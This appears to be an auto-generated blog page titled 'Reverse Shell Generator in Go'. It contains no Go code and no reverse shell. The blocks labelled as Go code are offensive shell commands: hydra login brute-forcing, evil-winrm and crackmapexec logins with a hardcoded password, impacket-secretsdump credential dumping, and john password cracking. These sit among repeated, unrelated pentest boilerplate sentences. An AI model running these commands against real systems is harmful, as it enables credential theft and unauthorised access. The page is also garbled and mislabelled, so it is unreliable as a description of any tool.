---
TitleSEO: "Reverse Shell Generator in Go | ZureFX"
TitlePost: "Reverse Shell Generator — Go"
Author: "ZureFX"
Description: "A Go script for reverse shell generator. Built for security research and automation."
Keywords: "scanner, rust, c, tool, automation, go"
URL: "https://zurefx.github.io/scripting/script-reverse-shell-generator-928.html"
URL_IMAGES: ""
Date: "2024-07-10"
Tags: "Scanner, Rust, C, Tool, Automation, Go"
Section: "scripting"
Lang: "en"
main_img: "script-reverse-shell-generator-928"
Permalink: "/scripting/script-reverse-shell-generator-928.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `evil-winrm`
- `sqlmap`
- `bloodhound`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target.

```go
feroxbuster -h
evil-winrm -i 10.35.16.214 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p9200,27017,3389 10.44.178.206 -oN scan.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

### Helper Functions

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation.

```go
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.97.237.96 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.157.161 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.95.111.76/FUZZ
```

## Usage

### Basic Usage

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine.

```bash
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.76.52.19 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.123.3.63/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.80.236.66
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.107.239.55/FUZZ
```

## Output

### Example Output

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

```
[+] Scanning target...
[+] Found 18 results
[+] Done in 12.97s
```
